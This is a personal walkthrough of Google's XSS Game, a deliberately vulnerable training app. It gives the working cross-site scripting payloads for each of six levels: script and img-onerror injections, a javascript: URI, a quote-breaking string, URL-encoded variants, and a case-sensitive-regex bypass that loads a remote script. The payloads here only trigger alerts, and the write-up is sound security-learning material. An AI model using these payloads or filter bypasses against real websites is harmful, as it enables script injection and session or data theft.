# Notes on Google's [XSS Game][1] Web App

## [Level 1](https://xss-game.appspot.com/level1)
Level 1 is vulnerable to a Reflected XSS attack. It can be exploited by injecting XSS code into either the form field or the URL. Both of these examples work if you paste them into the form field and press the Search button:

```html
<img src=x onerror="alert('xss')">
<script>alert("xss");</script>
```

Both of the above examples also work if you inject them into the URL and press the Go button (which is part of the fake browser). The only limitation I found was that code injected into the URL will not work if it has a semicolon. In the second example above, you could just omit the semicolon, since it is only a one-line script.

But the attack does work through the URL if you just URL-encode the semicolon as `%3B`. Note that you'll have to prepend your attack code with: `?query=`. So you're concatenating three separate pieces:

1. `https://xss-game.appspot.com/level1/frame`
2. `?query=`
3. `<script>alert("xss")%3B</script>`

The full URL is now:
```code
https://xss-game.appspot.com/level1/frame?query=<script>alert("xss")%3B</script>
```

## [Level 2](https://xss-game.appspot.com/level2)
Level 2 is about Stored (aka persistent) XSS. This level seems to have some filtering to prevent you from injecting `<script>` tags. But it does allow `<img>` tags. And `<img>` tags allow handlers (like `onerror`) which can contain Javascript:

```
<img src="x" onerror="alert('xss')">
```

Once that attack string is submitted through the form field, every time the page loads, our Javascript will run in the user's browser - any user - they just have to visit this page. This is why stored XSS is more dangerous than Reflected XSS.

I could not figure out a way to inject the code directly into the URL.

## [Level 3](https://xss-game.appspot.com/level3)
To get past Level 3 I had to use Safari (10.0.3) because Firefox (51.0.1) and Chrome (55.0.2883.95) both prevented the injection of a space, encoded or not, after the single quote. Here is the full URL I used to successfully pass Level 3 with Safari:
```code
https://xss-game.appspot.com/level3/frame' onerror="alert('xss')"
```
But I wanted to keep working with Firefox. So I copied Safari's cookie called "level3". To do this:

1. I configured Safari to use the Burp proxy.
1. I exploited Level 1 and 2 as described above.
1. I visited the URL for level three, with the attack code appended, as shown above. When the `alert()` popped up, the game set a new cookie called `level3`.
1. I copied the name and value of the third cookie:

  ```code
  level1=f148716ef4ed1ba0f192cde4618f8dc5;
  level2=b5e530302374aa71cc3028c810b63641;
  level3=d5ce029d0680b3816a349da0d055fcfa;
  ```

  Here's how to set a new cookie in FF or Chrome using the console in dev tools:

  ```javascript
  document.cookie="level3=d5ce029d0680b3816a349da0d055fcfa";
  ```

Now you can advance to level 4 in FF or Chrome. But, unlike the other cookies set by the game, the manually-set cookie will be set to expire at the end of the session. So if you close your browser tab for `xss-game.appspot.com`, then open a new tab to that website, you'll find that you can't go to Level 4. This is because the `level3` cookie expired when the previous session ended. So the better way to manually set that cookie is to include a value for the `expires` attribute:

```javascript
document.cookie="level3=d5ce029d0680b3816a349da0d055fcfa;expires='Fri, 22 July 2022 5:34:56 GMT'";
```

You can set several other cookie attributes like this, but the [specification][2] for `document.cookie` is very detailed and specific about syntax.


## [Level 4](https://xss-game.appspot.com/level4)

I couldn't figure out Level 4. I had to Google somebody else's answer and then play with it because it was not working as they described. Eventually I found that, in all three browsers, this string worked if you input it into the form field and clicked the "create timer" button.

```
');alert();var b=('
```

But to get this attack to work by injecting directly into the URL, you first have to URL-encode the attack string:

```
%27%29%3Balert%28%29%3Bvar+b%3D%28%27
```

There are websites that will do this for you. But they can be buggy and unreliable. Recently I've been using this, which is included by default with Python 2.7.x:

```python
>>> import urllib
>>> foo = "');alert();var b=('"
>>> urllib.quote_plus(foo)
'%27%29%3Balert%28%29%3Bvar+b%3D%28%27'
```

Remember to surround the attack string with double quotes in the variable assignment. Also remember to remove the outer single quotes that Python added to the output. It's slightly different in Python 3. I learned about this in an [answer][3] on StackExchange.com.

Now, similar to the URL assembly we did for Level 1, we need to prepend the attack string with the right variable name, preceded by a `?` and followed by a `=`. We're concatenating these elements:

1. `https://xss-game.appspot.com/level4/frame`
2. `?timer=`
3. `%27%29%3Balert%28%29%3Bvar+b%3D%28%27`

Which becomes:

```code
https://xss-game.appspot.com/level4/frame?timer=%27%29%3Balert%28%29%3Bvar+b%3D%28%27
```

Now just click the "Go" button in the fake browser.


## [Level 5](https://xss-game.appspot.com/level5)
To get through this level you have to do these in order:

1. Click on the "Sign up" link.
2. On the next page the URL will have changed to this:

   ```code
   https://xss-game.appspot.com/level5/frame/signup?next=confirm
   ```

   In the URL, change the value of `next` from `confirm` to `javascript:alert(1)`.
3. Click the "Go" button, which is part of the fake browser. Clicking this button changes the value of the `href` for the "Next >>" link. Before you click the "Go" button, if you hover over the "Next >>" link, the target shown in the hoverbox is:

   ```code
   https://xss-game.appspot.com/level5/frame/confirm
   ```

   And in fact the `href` value is a relative link, simply `confirm`. After changing `confirm` to `javascript:alert(1)`, the URL is now set to this:

   ```code
   https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)
   ```

   Click the "Go" button. Now if you hover over that same "Next >>" link, the target shown in the hoverbox is now just:

   ```
   javascript:alert(1)
   ```

   By the user having edited the URL manually, that link's `href` value had changed to the user's input.
4. Click the "Next >>" link. The alert pops up and the game sets a new cookie and displays a banner saying that you may now go on to the next level.

I think the lesson here was that if you can't inject any tags you can still inject the `javascript:` resource identifier before the actual Javascript code. I had to click on all four hints until I followed Hint 4's link to [this IETF draft](https://tools.ietf.org/html/draft-hoehrmann-javascript-scheme-00).


## [Level 6](https://xss-game.appspot.com/level6)
For Level 6 I had to look up the answer. It turns out that a custom client-side filtering regex was case sensitive when filtering out URLs beginning with `http` or `https`. So this is the successful URL:

```
https://xss-game.appspot.com/level6/frame#HTTPS://xss.rocks/xss.js
```

Notice that I've used one of the non-malicious Javascript files available at [xss.rocks][4].

I never would have guessed this solution. I did look at the source code and I figured that the regex in the following function was stopping me from injecting an `http` or `https` into the URL. I guess I was being lazy by not taking the regex somewhere and testing it. For this documentation I tested the regex at the w3schools.com ["Try It" page][5] for the Javascript string `match()` method.

This function can be found on line 57 of the source code of the page for Level 6:

```javascript
      // This will totally prevent us from loading evil URLs!
      if (url.match(/^https?:\/\//)) {
        setInnerText(document.getElementById("log"),
          "Sorry, cannot load a URL containing \"http\".");
        return;
      }
```

The regex is `/^https?:\/\//` and will match `http` or `https`. But if the developer had appended `i` to the regex, then it would have matched any combination of upper and lower case versions of those strings. The case-insensitive regex would be `/^https?:\/\//i`

I guess the lesson in this level was that you should read through all the source code (HTML and JS) to see if the developers wrote any client-side filtering code, and if they made any mistakes in doing so.


[1]: https://xss-game.appspot.com/
[2]: https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie
[3]: http://stackoverflow.com/a/9345102
[4]: http://xss.rocks/
[5]: http://www.w3schools.com/jsref/tryit.asp?filename=tryjsref_match_regexp2
